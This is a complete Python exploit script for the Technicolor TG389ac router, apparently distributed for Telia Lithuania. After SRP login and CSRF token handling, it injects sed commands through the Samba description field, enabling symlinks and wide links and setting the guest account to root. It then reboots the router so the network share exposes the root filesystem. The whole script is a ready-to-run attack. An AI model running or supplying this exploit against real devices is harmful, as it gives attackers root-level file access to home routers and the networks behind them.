# FDEU-CVE-2020-1FC5 samba exploit for Technicolor TG389ac Telia Lithuania

from getpass import getpass
import requests
import srp
import sys
import binascii
import json

import urllib3
urllib3.disable_warnings()

if len (sys.argv) != 3:
	print ("Usage: " + sys.argv[0] + " router_url user")
	print ("Example:")
	print (sys.argv[0] + " http://192.168.1.254 admin")
	print (sys.argv[0] + " https://10.0.1.2:8443 admin")
	exit()

password = getpass()
router = sys.argv[1]
username = sys.argv[2]

print ("[*] Init SRP authentication")
# Technicolor TG389ac expects only SHA256 and uses broken SRP implementation
usr = srp.User(username, password, srp.SHA256)
usr.k = int("05b9e8ef059c6b32ea59fc1d322d37f04aa30bae5aa9003b8321e21ddb04e300", 16)
uname, A = usr.start_authentication()
Ahex = binascii.b2a_hex(A).decode("utf-8") 

print ("[*] Get CSRF token")
url = router + "/login.lp?action=getcsrf"
session = requests.Session()
res = session.get (url, verify=False)
if res.status_code != 200:
	print ("[*] Error: cannot get CSRF token, status code: " + res.status_code)
	exit()
csrf = res.content.decode("utf-8") 

print ("[*] Send authentication challenge")
postdata = {"CSRFtoken": csrf, "I": username, "A": Ahex}
url = router + "/authenticate"
res = session.post (url, data=postdata, verify=False)
if res.status_code != 200:
	print ("[*] Error: start authentication, status code: " + res.status_code)
	exit()
challenge = json.loads (res.content.decode("utf-8"))
shex = challenge["s"]
Bhex = challenge["B"]
s = binascii.unhexlify(shex)
B = binascii.unhexlify(Bhex)

print ("[*] Send authentication response")
M = usr.process_challenge (s, B)
Mhex = binascii.b2a_hex(M).decode("utf-8")
postdata = {"CSRFtoken": csrf, "M": Mhex}
res = session.post (url, data=postdata, verify=False)
if res.status_code != 200:
	print ("[*] Error: cannot authenticate, status code: " + res.status_code)
	exit()

print ("[*] Renew CSRF token")
url = router + "/login.lp?action=getcsrf"
res = session.get (url, verify=False)
if res.status_code != 200:
	print ("[*] Error: cannot get CSRF token, status code: " + res.status_code)
	exit()
csrf = res.content.decode("utf-8") 

print ("[*] Submit dummy samba config")
url = router + "/modals/contentsharing-modal.lp"
postdata = {"samba_filesharing": "1", "samba_name": "Tecnhnicolor", "samba_workgroup": "WORKGROUP", "samba_description": "Description", "dlna_enabled": "1", "dlna_friendly_name": "Technicolor DLNA Server", "action": "SAVE", "fromModal": "YES", "CSRFtoken": csrf}
res = session.post (url, data=postdata, verify=False)
if res.status_code != 200:
	print ("[*] Error: cannot enable samba, status code: " + res.status_code)
	exit()

print ("[*] Submit samba exploit")
postdata = {"samba_name": "Tecnhnicolor", "samba_workgroup": "WORKGROUP", "samba_description": "pwned#g ; s#follow symlinks = no#follow symlinks = yes#g ; s#wide links = no#wide links = yes#g ; s#security = share#security = user#g ; s#guest account = nobody#guest account = root", "dlna_enabled": "1", "dlna_friendly_name": "Technicolor DLNA Server", "action": "SAVE", "fromModal": "YES", "CSRFtoken": csrf}
res = session.post (url, data=postdata, verify=False)
if res.status_code != 200:
	print ("[*] Error: cannot submit exploit, status code: " + res.status_code)
	exit()

print ("[*] Reboot the router")
url = router + "/modals/gateway-modal.lp"
postdata = {"action": "system_reboot", "CSRFtoken": csrf}
res = session.post (url, data=postdata, verify=False)
if res.status_code != 200:
	print ("[*] Error: cannot reboot, status code: " + res.status_code)
	exit()
print (res.content)

print ("[*] Done. Wait until the rooter boots and open the network share")
print ("Example: \\\\192.168.1.254 or smb://192.168.1.254")

